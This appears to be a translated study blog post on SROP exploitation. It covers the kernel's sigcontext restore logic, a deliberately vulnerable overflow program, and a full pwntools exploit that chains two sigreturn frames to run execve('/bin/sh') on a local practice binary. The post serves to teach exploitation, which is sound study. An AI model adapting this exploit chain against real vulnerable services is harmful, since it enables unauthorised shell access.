---
title: "[PWNABLE] SROP"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※ SROP (SigReturn-Oriented Programming) is a ROP technique that uses the sigreturn syscall. In the process of processing signals, interaction between user mode and kernel mode occurs. This process is called context switching. you"
date: "2024-05-02"
translation_key: "tistory-b274056796bb"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-SROP"
private: false
---

**※ If there are any mistakes, please let me know. We will check and correct it. **※**** 

SROP (SigReturn-Oriented Programming) is a ROP technique that uses the sigreturn syscall.

In the process of processing signals, interaction between user mode <-> kernel mode occurs.

This process is called context switching.

When switching from user mode to kernel mode, information including existing register values ​​must be maintained so that the next functions can be continued even after returning. 

At this time, the function that restores the value is restore\_sigcontext.

```
static bool restore_sigcontext(struct pt_regs *regs,
			       struct sigcontext __user *usc,
			       unsigned long uc_flags)
{
	struct sigcontext sc;
	/* Always make any pending restarted system calls return -EINTR */
	current->restart_block.fn = do_no_restart_syscall;
	if (copy_from_user(&sc, usc, CONTEXT_COPY_SIZE))
		return false;
#ifdef CONFIG_X86_32
	set_user_gs(regs, sc.gs);
	regs->fs = sc.fs;
	regs->es = sc.es;
	regs->ds = sc.ds;
#endif /* CONFIG_X86_32 */
	regs->bx = sc.bx;
	regs->cx = sc.cx;
	regs->dx = sc.dx;
	regs->si = sc.si;
	regs->di = sc.di;
	regs->bp = sc.bp;
	regs->ax = sc.ax;
	regs->sp = sc.sp;
	regs->ip = sc.ip;
#ifdef CONFIG_X86_64
	regs->r8 = sc.r8;
	regs->r9 = sc.r9;
	regs->r10 = sc.r10;
	regs->r11 = sc.r11;
	regs->r12 = sc.r12;
	regs->r13 = sc.r13;
	regs->r14 = sc.r14;
	regs->r15 = sc.r15;
#endif /* CONFIG_X86_64 */
	/* Get CS/SS and force CPL3 */
	regs->cs = sc.cs | 0x03;
	regs->ss = sc.ss | 0x03;
	regs->flags = (regs->flags & ~FIX_EFLAGS) | (sc.flags & FIX_EFLAGS);
	/* disable syscall checks */
	regs->orig_ax = -1;
#ifdef CONFIG_X86_64
	/*
	 * Fix up SS if needed for the benefit of old DOSEMU and
	 * CRIU.
	 */
	if (unlikely(!(uc_flags & UC_STRICT_RESTORE_SS) && user_64bit_mode(regs)))
		force_valid_ss(regs);
#endif
	return fpu__restore_sig((void __user *)sc.fpstate,
			       IS_ENABLED(CONFIG_X86_32));
}
```

The code is that of restore\_sigcontext().

If you look at the code above, the information of each register and stack is copied and stored and set again when returning.

The rescue vehicle referred to at this time is sigcontext.

```
/* __x86_64__: */
struct sigcontext {
  __u64               r8;
  __u64               r9;
  __u64               r10;
  __u64               r11;
  __u64               r12;
  __u64               r13;
  __u64               r14;
  __u64               r15;
  __u64               rdi;
  __u64               rsi;
  __u64               rbp;
  __u64               rbx;
  __u64               rdx;
  __u64               rax;
  __u64               rcx;
  __u64               rsp;
  __u64               rip;
  __u64               eflags;     /* RFLAGS */
  __u16               cs;
  __u16               gs;
  __u16               fs;
  union {
      __u16           ss; /* If UC_SIGCONTEXT_SS */
      __u16           __pad0; /* Alias name for old (!UC_SIGCONTEXT_SS) user-space */
  };
  __u64               err;
  __u64               trapno;
  __u64               oldmask;
  __u64               cr2;
  struct _fpstate __user      *fpstate;   /* Zero when no FPU context */
#  ifdef __ILP32__
  __u32               __fpstate_pad;
#  endif
  __u64               reserved1[8];
};
```

If you look at it this way, you may immediately understand what it means, but most likely you won't.

```
#include <unistd.h>

int gift() {
  asm("pop %rax;"
      "syscall;"
      "ret" );
}

int main()
{
  printf("hello ZZoMb1E!\n");
  char buf[16];
  read(0, buf ,1000);
  
  return 0;
}
```

If you look at the given code, it provides an overflow vulnerability and a function for syscall.

The rax of the function that generates the signal is 0xf, so you can use this to generate an alarm and modulate it.

I looked at various blogs, including Dream Hack, and Dream Hack uses a function called SigreturnFrame().

Using this function, you can enter values ​​only for the desired elements of the sigcontext structure.

First, the bss area must be set as a new stack and the value must be input.

Setting the register to perform the above function is as follows.

```
sigframe.rsp = bss
sigframe.rax = 0x0
sigframe.rdi = 0x0
sigframe.rsi = bss
sigframe.rdx = 0x1000
sigframe.rip = syscall
```

Afterwards, execve("/bin/sh",0,0) must be implemented with the entered value.

```
sig2.rax = 0x3b
sig2.rip = syscall
sig2.rsi = 0x0
sig2.rdi = bss + 0x108
sig2.rdx = 0x0
```

The code for that part is as above.

The reason why bss+0x108 is given at this time is because the length of SigreturnFrame() is 0xf8.

This is because syscall and 0x0 are entered here, and a total of 0x108 buffer is entered before the /bin/sh/ string.

![](/assets/images/tistory/tistory-b274056796bb/001.png)

If you write the above value as a payload and send it, you can see the stack changing as shown below.

![](/assets/images/tistory/tistory-b274056796bb/002.png)

```
from pwn import*

context.arch = 'x86_64'

p = process("./srop")
e = ELF("./srop")

gadget = next(e.search(asm('pop rax; syscall')))
syscall = next(e.search(asm('syscall')))
bss = e.bss()

sigframe = SigreturnFrame()

sigframe.rsp = bss
sigframe.rax = 0x0
sigframe.rdi = 0x0
sigframe.rsi = bss
sigframe.rdx = 0x1000
sigframe.rip = syscall

payload = b'a'*0x10
payload += b'b'*0x8
payload += p64(gadget)
payload += p64(0xf)
payload += bytes(sigframe)
p.sendline(payload)

sig2 = SigreturnFrame()

sig2.rax = 0x3b
sig2.rip = syscall
sig2.rsi = 0x0
sig2.rdi = bss + 0x108
sig2.rdx = 0x0

payload = p64(gadget)
payload += p64(0xf)
payload += bytes(sig2)
payload += b"/bin/sh\x00"

p.sendline(payload)
```

If you run it, you can see that the shell has been obtained normally as shown below.

![](/assets/images/tistory/tistory-b274056796bb/003.png)